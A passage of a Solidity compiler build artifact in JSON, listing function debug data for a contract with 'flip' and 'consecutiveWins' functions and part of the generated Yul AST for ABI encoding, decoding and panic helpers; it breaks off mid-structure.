							"sourceMap": "58:738:0:-:0;;;157:77;140:94;;241:50;;;;;;;;;;283:1;265:15;:19;;;;58:738;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {
								"@consecutiveWins_3": {
									"entryPoint": 274,
									"id": 3,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"@flip_80": {
									"entryPoint": 134,
									"id": 80,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"abi_decode_t_bool": {
									"entryPoint": 316,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_tuple_t_bool": {
									"entryPoint": 336,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_t_bool_to_t_bool_fromStack": {
									"entryPoint": 379,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_encode_t_uint256_to_t_uint256_fromStack": {
									"entryPoint": 428,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed": {
									"entryPoint": 394,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed": {
									"entryPoint": 443,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"allocate_unbounded": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"checked_div_t_uint256": {
									"entryPoint": 609,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"checked_sub_t_uint256": {
									"entryPoint": 513,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"cleanup_t_bool": {
									"entryPoint": 283,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_uint256": {
									"entryPoint": 419,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"increment_t_uint256": {
									"entryPoint": 657,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"panic_error_0x11": {
									"entryPoint": 468,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"panic_error_0x12": {
									"entryPoint": 564,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b": {
									"entryPoint": 279,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"validator_revert_t_bool": {
									"entryPoint": 294,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 0
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nativeSrc": "0:2785:2",
										"nodeType": "YulBlock",
										"src": "0:2785:2",
										"statements": [
											{
												"body": {
													"nativeSrc": "47:35:2",
													"nodeType": "YulBlock",
													"src": "47:35:2",
													"statements": [
														{
															"nativeSrc": "57:19:2",
															"nodeType": "YulAssignment",
															"src": "57:19:2",
															"value": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "73:2:2",
																		"nodeType": "YulLiteral",
																		"src": "73:2:2",
																		"type": "",
																		"value": "64"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nativeSrc": "67:5:2",
																	"nodeType": "YulIdentifier",
																	"src": "67:5:2"
																},
																"nativeSrc": "67:9:2",
																"nodeType": "YulFunctionCall",
																"src": "67:9:2"
															},
															"variableNames": [
																{
																	"name": "memPtr",
																	"nativeSrc": "57:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "57:6:2"
																}
															]
														}
													]
												},
												"name": "allocate_unbounded",
												"nativeSrc": "7:75:2",
												"nodeType": "YulFunctionDefinition",
												"returnVariables": [
													{
														"name": "memPtr",
														"nativeSrc": "40:6:2",
														"nodeType": "YulTypedName",
														"src": "40:6:2",
														"type": ""
													}
												],
												"src": "7:75:2"
											},
											{
												"body": {
													"nativeSrc": "177:28:2",
													"nodeType": "YulBlock",
													"src": "177:28:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "194:1:2",
																		"nodeType": "YulLiteral",
																		"src": "194:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "197:1:2",
																		"nodeType": "YulLiteral",
																		"src": "197:1:2",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nativeSrc": "187:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "187:6:2"
																},
																"nativeSrc": "187:12:2",
																"nodeType": "YulFunctionCall",
																"src": "187:12:2"
															},
															"nativeSrc": "187:12:2",
															"nodeType": "YulExpressionStatement",
															"src": "187:12:2"
														}
													]
												},
												"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
												"nativeSrc": "88:117:2",
												"nodeType": "YulFunctionDefinition",
												"src": "88:117:2"
											},
											{
												"body": {
													"nativeSrc": "300:28:2",
													"nodeType": "YulBlock",
													"src": "300:28:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "317:1:2",
																		"nodeType": "YulLiteral",
																		"src": "317:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "320:1:2",
																		"nodeType": "YulLiteral",
																		"src": "320:1:2",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nativeSrc": "310:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "310:6:2"
																},
																"nativeSrc": "310:12:2",
																"nodeType": "YulFunctionCall",
																"src": "310:12:2"
															},
															"nativeSrc": "310:12:2",
															"nodeType": "YulExpressionStatement",
															"src": "310:12:2"
														}
													]
												},
												"name": "revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db",
												"nativeSrc": "211:117:2",
												"nodeType": "YulFunctionDefinition",
												"src": "211:117:2"
											},
											{
												"body": {
													"nativeSrc": "376:48:2",
													"nodeType": "YulBlock",
													"src": "376:48:2",
													"statements": [
														{
															"nativeSrc": "386:32:2",
															"nodeType": "YulAssignment",
															"src": "386:32:2",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nativeSrc": "411:5:2",
																				"nodeType": "YulIdentifier",
																				"src": "411:5:2"
																			}
																		],
																		"functionName": {
																			"name": "iszero",
																			"nativeSrc": "404:6:2",
																			"nodeType": "YulIdentifier",
																			"src": "404:6:2"
																		},
																		"nativeSrc": "404:13:2",
																		"nodeType": "YulFunctionCall",
																		"src": "404:13:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nativeSrc": "397:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "397:6:2"
																},
																"nativeSrc": "397:21:2",
																"nodeType": "YulFunctionCall",
																"src": "397:21:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nativeSrc": "386:7:2",
																	"nodeType": "YulIdentifier",
																	"src": "386:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_bool",
												"nativeSrc": "334:90:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "358:5:2",
														"nodeType": "YulTypedName",
														"src": "358:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nativeSrc": "368:7:2",
														"nodeType": "YulTypedName",
														"src": "368:7:2",
														"type": ""
													}
												],
												"src": "334:90:2"
											},
											{
												"body": {
													"nativeSrc": "470:76:2",
													"nodeType": "YulBlock",
													"src": "470:76:2",
													"statements": [
														{
															"body": {
																"nativeSrc": "524:16:2",
																"nodeType": "YulBlock",
																"src": "524:16:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nativeSrc": "533:1:2",
																					"nodeType": "YulLiteral",
																					"src": "533:1:2",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nativeSrc": "536:1:2",
																					"nodeType": "YulLiteral",
																					"src": "536:1:2",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nativeSrc": "526:6:2",
																				"nodeType": "YulIdentifier",
																				"src": "526:6:2"
																			},
																			"nativeSrc": "526:12:2",
																			"nodeType": "YulFunctionCall",
																			"src": "526:12:2"
																		},
																		"nativeSrc": "526:12:2",
																		"nodeType": "YulExpressionStatement",
																		"src": "526:12:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nativeSrc": "493:5:2",
																				"nodeType": "YulIdentifier",
																				"src": "493:5:2"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nativeSrc": "515:5:2",
																						"nodeType": "YulIdentifier",
																						"src": "515:5:2"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_bool",
																					"nativeSrc": "500:14:2",
																					"nodeType": "YulIdentifier",
																					"src": "500:14:2"
																				},
																				"nativeSrc": "500:21:2",
																				"nodeType": "YulFunctionCall",
																				"src": "500:21:2"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nativeSrc": "490:2:2",
																			"nodeType": "YulIdentifier",
																			"src": "490:2:2"
																		},
																		"nativeSrc": "490:32:2",
																		"nodeType": "YulFunctionCall",
																		"src": "490:32:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nativeSrc": "483:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "483:6:2"
																},
																"nativeSrc": "483:40:2",
																"nodeType": "YulFunctionCall",
																"src": "483:40:2"
															},
															"nativeSrc": "480:60:2",
															"nodeType": "YulIf",
															"src": "480:60:2"
														}
													]
												},
												"name": "validator_revert_t_bool",
												"nativeSrc": "430:116:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "463:5:2",
														"nodeType": "YulTypedName",
														"src": "463:5:2",
														"type": ""
													}
												],
												"src": "430:116:2"
											},
											{
												"body": {
													"nativeSrc": "601:84:2",
													"nodeType": "YulBlock",
													"src": "601:84:2",
													"statements": [
														{
															"nativeSrc": "611:29:2",
															"nodeType": "YulAssignment",
															"src": "611:29:2",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nativeSrc": "633:6:2",
																		"nodeType": "YulIdentifier",
																		"src": "633:6:2"
																	}
																],
																"functionName": {
																	"name": "calldataload",
																	"nativeSrc": "620:12:2",
																	"nodeType": "YulIdentifier",
																	"src": "620:12:2"
																},
																"nativeSrc": "620:20:2",
																"nodeType": "YulFunctionCall",
																"src": "620:20:2"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nativeSrc": "611:5:2",
																	"nodeType": "YulIdentifier",
																	"src": "611:5:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "673:5:2",
																		"nodeType": "YulIdentifier",
																		"src": "673:5:2"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_bool",
																	"nativeSrc": "649:23:2",
																	"nodeType": "YulIdentifier",
																	"src": "649:23:2"
																},
																"nativeSrc": "649:30:2",
																"nodeType": "YulFunctionCall",
																"src": "649:30:2"
															},
															"nativeSrc": "649:30:2",
															"nodeType": "YulExpressionStatement",
															"src": "649:30:2"
														}
													]
												},
												"name": "abi_decode_t_bool",
												"nativeSrc": "552:133:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nativeSrc": "579:6:2",
														"nodeType": "YulTypedName",
														"src": "579:6:2",
														"type": ""
													},
													{
														"name": "end",
														"nativeSrc": "587:3:2",
														"nodeType": "YulTypedName",
														"src": "587:3:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nativeSrc": "595:5:2",
														"nodeType": "YulTypedName",
														"src": "595:5:2",
														"type": ""
													}
												],
												"src": "552:133:2"
											},
											{
												"body": {
													"nativeSrc": "754:260:2",
													"nodeType": "YulBlock",
													"src": "754:260:2",
													"statements": [
														{
															"body": {
																"nativeSrc": "800:83:2",
																"nodeType": "YulBlock",
																"src": "800:83:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
																				"nativeSrc": "802:77:2",
																				"nodeType": "YulIdentifier",
																				"src": "802:77:2"
																			},
																			"nativeSrc": "802:79:2",
																			"nodeType": "YulFunctionCall",
																			"src": "802:79:2"
																		},
																		"nativeSrc": "802:79:2",
																		"nodeType": "YulExpressionStatement",
																		"src": "802:79:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nativeSrc": "775:7:2",
																				"nodeType": "YulIdentifier",
																				"src": "775:7:2"
																			},
																			{
																				"name": "headStart",
																				"nativeSrc": "784:9:2",
																				"nodeType": "YulIdentifier",
																				"src": "784:9:2"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nativeSrc": "771:3:2",
																			"nodeType": "YulIdentifier",
																			"src": "771:3:2"
																		},
																		"nativeSrc": "771:23:2",
																		"nodeType": "YulFunctionCall",
																		"src": "771:23:2"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "796:2:2",
																		"nodeType": "YulLiteral",
																		"src": "796:2:2",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nativeSrc": "767:3:2",
																	"nodeType": "YulIdentifier",
																	"src": "767:3:2"
																},
																"nativeSrc": "767:32:2",
																"nodeType": "YulFunctionCall",
																"src": "767:32:2"
															},
															"nativeSrc": "764:119:2",
															"nodeType": "YulIf",
															"src": "764:119:2"
														},
														{
															"nativeSrc": "893:114:2",
															"nodeType": "YulBlock",
															"src": "893:114:2",
															"statements": [
																{
																	"nativeSrc": "908:15:2",
																	"nodeType": "YulVariableDeclaration",
																	"src": "908:15:2",
																	"value": {
																		"kind": "number",
																		"nativeSrc": "922:1:2",
																		"nodeType": "YulLiteral",
																		"src": "922:1:2",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nativeSrc": "912:6:2",
																			"nodeType": "YulTypedName",
																			"src": "912:6:2",
																			"type": ""
																		}
																	]
																},
																{
																	"nativeSrc": "937:60:2",
																	"nodeType": "YulAssignment",
																	"src": "937:60:2",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nativeSrc": "969:9:2",
																						"nodeType": "YulIdentifier",
																						"src": "969:9:2"
																					},
																					{
																						"name": "offset",
																						"nativeSrc": "980:6:2",
																						"nodeType": "YulIdentifier",
																						"src": "980:6:2"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nativeSrc": "965:3:2",
																					"nodeType": "YulIdentifier",
																					"src": "965:3:2"
																				},
																				"nativeSrc": "965:22:2",
																				"nodeType": "YulFunctionCall",
																				"src": "965:22:2"
																			},
																			{
																				"name": "dataEnd",
																				"nativeSrc": "989:7:2",
																				"nodeType": "YulIdentifier",
																				"src": "989:7:2"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_bool",
																			"nativeSrc": "947:17:2",
																			"nodeType": "YulIdentifier",
																			"src": "947:17:2"
																		},
																		"nativeSrc": "947:50:2",
																		"nodeType": "YulFunctionCall",
																		"src": "947:50:2"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nativeSrc": "937:6:2",
																			"nodeType": "YulIdentifier",
																			"src": "937:6:2"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_bool",
												"nativeSrc": "691:323:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nativeSrc": "724:9:2",
														"nodeType": "YulTypedName",
														"src": "724:9:2",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nativeSrc": "735:7:2",
														"nodeType": "YulTypedName",
														"src": "735:7:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nativeSrc": "747:6:2",
														"nodeType": "YulTypedName",
														"src": "747:6:2",
														"type": ""
													}
												],
												"src": "691:323:2"
											},
											{
												"body": {
													"nativeSrc": "1079:50:2",
													"nodeType": "YulBlock",
													"src": "1079:50:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nativeSrc": "1096:3:2",
																		"nodeType": "YulIdentifier",
																		"src": "1096:3:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nativeSrc": "1116:5:2",
																				"nodeType": "YulIdentifier",
																				"src": "1116:5:2"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_bool",
																			"nativeSrc": "1101:14:2",
																			"nodeType": "YulIdentifier",
																			"src": "1101:14:2"
																		},
																		"nativeSrc": "1101:21:2",
																		"nodeType": "YulFunctionCall",
																		"src": "1101:21:2"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nativeSrc": "1089:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "1089:6:2"
																},
																"nativeSrc": "1089:34:2",
																"nodeType": "YulFunctionCall",
																"src": "1089:34:2"
															},
															"nativeSrc": "1089:34:2",
															"nodeType": "YulExpressionStatement",
															"src": "1089:34:2"
														}
													]
												},
												"name": "abi_encode_t_bool_to_t_bool_fromStack",
												"nativeSrc": "1020:109:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "1067:5:2",
														"nodeType": "YulTypedName",
														"src": "1067:5:2",
														"type": ""
													},
													{
														"name": "pos",
														"nativeSrc": "1074:3:2",
														"nodeType": "YulTypedName",
														"src": "1074:3:2",
														"type": ""
													}
												],
												"src": "1020:109:2"
											},
											{
												"body": {
													"nativeSrc": "1227:118:2",
													"nodeType": "YulBlock",
													"src": "1227:118:2",
													"statements": [
														{
															"nativeSrc": "1237:26:2",
															"nodeType": "YulAssignment",
															"src": "1237:26:2",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nativeSrc": "1249:9:2",
																		"nodeType": "YulIdentifier",
																		"src": "1249:9:2"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "1260:2:2",
																		"nodeType": "YulLiteral",
																		"src": "1260:2:2",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nativeSrc": "1245:3:2",
																	"nodeType": "YulIdentifier",
																	"src": "1245:3:2"
																},
																"nativeSrc": "1245:18:2",
																"nodeType": "YulFunctionCall",
																"src": "1245:18:2"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nativeSrc": "1237:4:2",
																	"nodeType": "YulIdentifier",
																	"src": "1237:4:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nativeSrc": "1311:6:2",
																		"nodeType": "YulIdentifier",
																		"src": "1311:6:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nativeSrc": "1324:9:2",
																				"nodeType": "YulIdentifier",
																				"src": "1324:9:2"
																			},
																			{
																				"kind": "number",
																				"nativeSrc": "1335:1:2",
																				"nodeType": "YulLiteral",
																				"src": "1335:1:2",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nativeSrc": "1320:3:2",
																			"nodeType": "YulIdentifier",
																			"src": "1320:3:2"
																		},
																		"nativeSrc": "1320:17:2",
																		"nodeType": "YulFunctionCall",
																		"src": "1320:17:2"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_bool_to_t_bool_fromStack",
																	"nativeSrc": "1273:37:2",
																	"nodeType": "YulIdentifier",
																	"src": "1273:37:2"
																},
																"nativeSrc": "1273:65:2",
																"nodeType": "YulFunctionCall",
																"src": "1273:65:2"
															},
															"nativeSrc": "1273:65:2",
															"nodeType": "YulExpressionStatement",
															"src": "1273:65:2"
														}
													]
												},
												"name": "abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed",
												"nativeSrc": "1135:210:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nativeSrc": "1199:9:2",
														"nodeType": "YulTypedName",
														"src": "1199:9:2",
														"type": ""
													},
													{
														"name": "value0",
														"nativeSrc": "1211:6:2",
														"nodeType": "YulTypedName",
														"src": "1211:6:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nativeSrc": "1222:4:2",
														"nodeType": "YulTypedName",
														"src": "1222:4:2",
														"type": ""
													}
												],
												"src": "1135:210:2"
											},
											{
												"body": {
													"nativeSrc": "1396:32:2",
													"nodeType": "YulBlock",
													"src": "1396:32:2",
													"statements": [
														{
															"nativeSrc": "1406:16:2",
															"nodeType": "YulAssignment",
															"src": "1406:16:2",
															"value": {
																"name": "value",
																"nativeSrc": "1417:5:2",
																"nodeType": "YulIdentifier",
																"src": "1417:5:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nativeSrc": "1406:7:2",
																	"nodeType": "YulIdentifier",
																	"src": "1406:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint256",
												"nativeSrc": "1351:77:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "1378:5:2",
														"nodeType": "YulTypedName",
														"src": "1378:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nativeSrc": "1388:7:2",
														"nodeType": "YulTypedName",
														"src": "1388:7:2",
														"type": ""
													}
												],
												"src": "1351:77:2"
											},
											{
												"body": {
													"nativeSrc": "1499:53:2",
													"nodeType": "YulBlock",
													"src": "1499:53:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nativeSrc": "1516:3:2",
																		"nodeType": "YulIdentifier",
																		"src": "1516:3:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nativeSrc": "1539:5:2",
																				"nodeType": "YulIdentifier",
																				"src": "1539:5:2"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_uint256",
																			"nativeSrc": "1521:17:2",
																			"nodeType": "YulIdentifier",
																			"src": "1521:17:2"
																		},
																		"nativeSrc": "1521:24:2",
																		"nodeType": "YulFunctionCall",
																		"src": "1521:24:2"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nativeSrc": "1509:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "1509:6:2"
																},
																"nativeSrc": "1509:37:2",
																"nodeType": "YulFunctionCall",
																"src": "1509:37:2"
															},
															"nativeSrc": "1509:37:2",
															"nodeType": "YulExpressionStatement",
															"src": "1509:37:2"
														}
													]
												},
												"name": "abi_encode_t_uint256_to_t_uint256_fromStack",
												"nativeSrc": "1434:118:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "1487:5:2",
														"nodeType": "YulTypedName",
														"src": "1487:5:2",
														"type": ""
													},
													{
														"name": "pos",
														"nativeSrc": "1494:3:2",
														"nodeType": "YulTypedName",
														"src": "1494:3:2",
														"type": ""
													}
												],
												"src": "1434:118:2"
											},
											{
												"body": {
													"nativeSrc": "1656:124:2",
													"nodeType": "YulBlock",
													"src": "1656:124:2",
													"statements": [
														{
															"nativeSrc": "1666:26:2",
															"nodeType": "YulAssignment",
															"src": "1666:26:2",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nativeSrc": "1678:9:2",
																		"nodeType": "YulIdentifier",
																		"src": "1678:9:2"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "1689:2:2",
																		"nodeType": "YulLiteral",
																		"src": "1689:2:2",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nativeSrc": "1674:3:2",
																	"nodeType": "YulIdentifier",
																	"src": "1674:3:2"
																},
																"nativeSrc": "1674:18:2",
																"nodeType": "YulFunctionCall",
																"src": "1674:18:2"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nativeSrc": "1666:4:2",
																	"nodeType": "YulIdentifier",
																	"src": "1666:4:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nativeSrc": "1746:6:2",
																		"nodeType": "YulIdentifier",
																		"src": "1746:6:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nativeSrc": "1759:9:2",
																				"nodeType": "YulIdentifier",
																				"src": "1759:9:2"
																			},
																			{
																				"kind": "number",
																				"nativeSrc": "1770:1:2",
																				"nodeType": "YulLiteral",
																				"src": "1770:1:2",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nativeSrc": "1755:3:2",
																			"nodeType": "YulIdentifier",
																			"src": "1755:3:2"
																		},
																		"nativeSrc": "1755:17:2",
																		"nodeType": "YulFunctionCall",
																		"src": "1755:17:2"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_uint256_to_t_uint256_fromStack",
																	"nativeSrc": "1702:43:2",
																	"nodeType": "YulIdentifier",
																	"src": "1702:43:2"
																},
																"nativeSrc": "1702:71:2",
																"nodeType": "YulFunctionCall",
																"src": "1702:71:2"
															},
															"nativeSrc": "1702:71:2",
															"nodeType": "YulExpressionStatement",
															"src": "1702:71:2"
														}
													]
												},
												"name": "abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed",
												"nativeSrc": "1558:222:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nativeSrc": "1628:9:2",
														"nodeType": "YulTypedName",
														"src": "1628:9:2",
														"type": ""
													},
													{
														"name": "value0",
														"nativeSrc": "1640:6:2",
														"nodeType": "YulTypedName",
														"src": "1640:6:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nativeSrc": "1651:4:2",
														"nodeType": "YulTypedName",
														"src": "1651:4:2",
														"type": ""
													}
												],
												"src": "1558:222:2"
											},
											{
												"body": {
													"nativeSrc": "1814:152:2",
													"nodeType": "YulBlock",
													"src": "1814:152:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "1831:1:2",
																		"nodeType": "YulLiteral",
																		"src": "1831:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "1834:77:2",
																		"nodeType": "YulLiteral",
																		"src": "1834:77:2",
																		"type": "",
																		"value": "35408467139433450592217433187231851964531694900788300625387963629091585785856"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nativeSrc": "1824:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "1824:6:2"
																},
																"nativeSrc": "1824:88:2",
																"nodeType": "YulFunctionCall",
																"src": "1824:88:2"
															},
															"nativeSrc": "1824:88:2",
															"nodeType": "YulExpressionStatement",
															"src": "1824:88:2"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "1928:1:2",
																		"nodeType": "YulLiteral",
																		"src": "1928:1:2",
																		"type": "",
																		"value": "4"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "1931:4:2",
																		"nodeType": "YulLiteral",
																		"src": "1931:4:2",
																		"type": "",
																		"value": "0x11"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nativeSrc": "1921:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "1921:6:2"
																},
																"nativeSrc": "1921:15:2",
																"nodeType": "YulFunctionCall",
																"src": "1921:15:2"
															},
															"nativeSrc": "1921:15:2",
															"nodeType": "YulExpressionStatement",
															"src": "1921:15:2"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "1952:1:2",
																		"nodeType": "YulLiteral",
																		"src": "1952:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "1955:4:2",
																		"nodeType": "YulLiteral",
																		"src": "1955:4:2",
																		"type": "",
																		"value": "0x24"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nativeSrc": "1945:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "1945:6:2"
																},
																"nativeSrc": "1945:15:2",
																"nodeType": "YulFunctionCall",
																"src": "1945:15:2"
															},
															"nativeSrc": "1945:15:2",
															"nodeType": "YulExpressionStatement",
															"src": "1945:15:2"
														}
													]
												},
												"name": "panic_error_0x11",
												"nativeSrc": "1786:180:2",
												"nodeType": "YulFunctionDefinition",
												"src": "1786:180:2"
											},
											{
												"body": {
													"nativeSrc": "2017:149:2",
													"nodeType": "YulBlock",
													"src": "2017:149:2",
													"statements": [
														{
															"nativeSrc": "2027:25:2",
															"nodeType": "YulAssignment",
															"src": "2027:25:2",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nativeSrc": "2050:1:2",
																		"nodeType": "YulIdentifier",
																		"src": "2050:1:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nativeSrc": "2032:17:2",
																	"nodeType": "YulIdentifier",
																	"src": "2032:17:2"
																},
																"nativeSrc": "2032:20:2",
																"nodeType": "YulFunctionCall",
																"src": "2032:20:2"
															},
															"variableNames": [
																{
																	"name": "x",
																	"nativeSrc": "2027:1:2",
																	"nodeType": "YulIdentifier",
																	"src": "2027:1:2"
																}
															]
														},
														{
															"nativeSrc": "2061:25:2",
															"nodeType": "YulAssignment",
															"src": "2061:25:2",
															"value": {
																"arguments": [
																	{
																		"name": "y",
																		"nativeSrc": "2084:1:2",
																		"nodeType": "YulIdentifier",
																		"src": "2084:1:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nativeSrc": "2066:17:2",
